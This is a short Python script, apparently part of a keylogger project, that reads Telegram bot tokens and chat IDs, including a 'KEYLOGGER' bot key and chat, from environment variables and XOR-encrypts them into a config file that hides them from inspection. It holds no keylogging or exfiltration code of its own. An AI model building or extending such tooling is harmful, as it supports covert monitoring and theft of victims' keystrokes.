# generate_config.py – Creates encrypted config from environment variables
import os
import json
import base64

def simple_encrypt(data, key):
    encrypted = bytearray()
    key_bytes = key.encode('utf-8')
    for i, char in enumerate(data.encode('utf-8')):
        encrypted.append(char ^ key_bytes[i % len(key_bytes)])
    return base64.urlsafe_b64encode(encrypted).decode('utf-8')

# Read from environment
bot_token = os.environ.get("BOT_API_KEY", "")
user_id = os.environ.get("TELEGRAM_USER_ID", "")
keylogger_token = os.environ.get("KEYLOGGER_BOT_API_KEY", "")
keylogger_chat = os.environ.get("KEYLOGGER_CHAT_ID", "")
encryption_password = os.environ.get("ENCRYPTION_PASSWORD", "")

if not bot_token or not user_id:
    print("ERROR: Missing required secrets!")
    exit(1)

config = {
    "BOT_API_KEY": bot_token,
    "telegram_user_id": int(user_id),
    "KEYLOGGER_BOT_API_KEY": keylogger_token,
    "KEYLOGGER_CHAT_ID": keylogger_chat
}

encrypted = simple_encrypt(json.dumps(config), encryption_password)
with open("config.enc", "w") as f:
    f.write(encrypted)

print("config.enc generated successfully")
